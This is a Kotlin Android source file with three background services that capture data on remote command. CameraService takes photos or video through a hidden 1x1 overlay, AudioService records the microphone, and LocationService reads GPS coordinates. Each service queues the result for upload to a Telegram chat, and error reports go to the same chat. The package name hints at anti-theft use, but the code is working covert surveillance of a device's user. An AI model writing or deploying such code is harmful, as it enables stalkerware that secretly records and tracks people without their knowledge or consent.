package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Environment
import android.os.IBinder
import android.util.Log
import android.view.SurfaceView
import android.view.WindowManager
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import com.save.me.formatDateTime

/**
 * CameraService: Takes photo or video in the background using a 1x1 overlay SurfaceView.
 */
class CameraService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.Default + job)

    companion object {
        const val EXTRA_TYPE = "type"
        const val EXTRA_CAMERA = "camera"
        const val EXTRA_FLASH = "flash"
        const val EXTRA_QUALITY = "quality"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_CHAT_ID = "chat_id"

        fun start(
            context: Context,
            type: String,
            camera: String,
            flash: Boolean,
            quality: Int?,
            duration: Int?,
            chatId: String?
        ) {
            val intent = Intent(context, CameraService::class.java).apply {
                putExtra(EXTRA_TYPE, type)
                putExtra(EXTRA_CAMERA, camera)
                putExtra(EXTRA_FLASH, flash)
                quality?.let { putExtra(EXTRA_QUALITY, it) }
                duration?.let { putExtra(EXTRA_DURATION, it) }
                chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
            }
            context.startForegroundService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val type = intent?.getStringExtra(EXTRA_TYPE) ?: "photo"
        val camera = intent?.getStringExtra(EXTRA_CAMERA) ?: "rear"
        val flash = intent?.getBooleanExtra(EXTRA_FLASH, false) ?: false
        val quality = intent?.getIntExtra(EXTRA_QUALITY, 720) ?: 720
        val duration = intent?.getIntExtra(EXTRA_DURATION, 60) ?: 60
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)

        scope.launch {
            try {
                val winMgr = getSystemService(WINDOW_SERVICE) as WindowManager
                val surfaceView = SurfaceView(this@CameraService)
                val lp = WindowManager.LayoutParams(
                    1, 1,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    android.graphics.PixelFormat.TRANSLUCENT
                )
                withContext(Dispatchers.Main) {
                    winMgr.addView(surfaceView, lp)
                }
                val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "remote_${System.currentTimeMillis()}.${if (type == "photo") "jpg" else "mp4"}")
                val actionTimestamp = System.currentTimeMillis()
                val result = CameraBackgroundHelper.takePhotoOrVideo(
                    this@CameraService,
                    surfaceView.holder,
                    type,
                    camera,
                    flash,
                    quality,
                    duration,
                    file
                )
                withContext(Dispatchers.Main) {
                    winMgr.removeView(surfaceView)
                }
                Log.d("CameraService", "Saved $type to ${file.absolutePath}")
                if (result && chatId != null) {
                    UploadManager.queueUpload(file, chatId, type, actionTimestamp)
                } else if (!result && chatId != null) {
                    val deviceNickname = Preferences.getNickname(this@CameraService) ?: "Device"
                    UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Failed to capture $type (permission denied or hardware error) at ${formatDateTime(actionTimestamp)}.")
                }
            } catch (e: Exception) {
                Log.e("CameraService", "Error: $e")
                if (chatId != null) {
                    val deviceNickname = Preferences.getNickname(this@CameraService) ?: "Device"
                    UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $type capture: ${e.localizedMessage} at ${formatDateTime(System.currentTimeMillis())}.")
                }
            } finally {
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

/**
 * AudioService: Records audio in the background.
 */
class AudioService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.Default + job)

    companion object {
        const val EXTRA_DURATION = "duration"
        const val EXTRA_CHAT_ID = "chat_id"

        fun start(context: Context, duration: Int = 120, chatId: String? = null) {
            val intent = Intent(context, AudioService::class.java).apply {
                putExtra(EXTRA_DURATION, duration)
                chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
            }
            context.startForegroundService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val duration = intent?.getIntExtra(EXTRA_DURATION, 120) ?: 120
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
        val actionTimestamp = System.currentTimeMillis()
        scope.launch {
            try {
                val file = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "remote_audio_${System.currentTimeMillis()}.m4a")
                AudioBackgroundHelper.recordAudio(this@AudioService, file, duration)
                Log.d("AudioService", "Saved audio to ${file.absolutePath}")
                if (chatId != null) {
                    UploadManager.queueUpload(file, chatId, "audio", actionTimestamp)
                }
            } catch (e: Exception) {
                Log.e("AudioService", "Error: $e")
                if (chatId != null) {
                    val deviceNickname = Preferences.getNickname(this@AudioService) ?: "Device"
                    UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in audio recording: ${e.localizedMessage} at ${formatDateTime(System.currentTimeMillis())}.")
                }
            } finally {
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

/**
 * LocationService: Gets current location and uploads it.
 */
class LocationService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.Default + job)

    companion object {
        const val EXTRA_CHAT_ID = "chat_id"

        fun start(context: Context, chatId: String? = null) {
            val intent = Intent(context, LocationService::class.java)
            chatId?.let { intent.putExtra(EXTRA_CHAT_ID, it) }
            context.startForegroundService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
        val actionTimestamp = System.currentTimeMillis()
        scope.launch {
            try {
                val location = LocationBackgroundHelper.getLastLocation(this@LocationService)
                if (location != null) {
                    Log.d("LocationService", "Location: ${location.latitude}, ${location.longitude}")
                    if (chatId != null) {
                        val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}.json")
                        FileOutputStream(file).use { out ->
                            out.write(
                                """{"lat":${location.latitude},"lng":${location.longitude},"timestamp":${location.time}}""".toByteArray()
                            )
                        }
                        UploadManager.queueUpload(file, chatId, "location", actionTimestamp)
                    }
                } else {
                    Log.e("LocationService", "Location not found")
                    if (chatId != null) {
                        val deviceNickname = Preferences.getNickname(this@LocationService) ?: "Device"
                        UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Location unavailable (GPS off or permission denied) at ${formatDateTime(actionTimestamp)}.")
                    }
                }
            } catch (e: Exception) {
                Log.e("LocationService", "Error: $e")
                if (chatId != null) {
                    val deviceNickname = Preferences.getNickname(this@LocationService) ?: "Device"
                    UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in location service: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}.")
                }
            } finally {
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}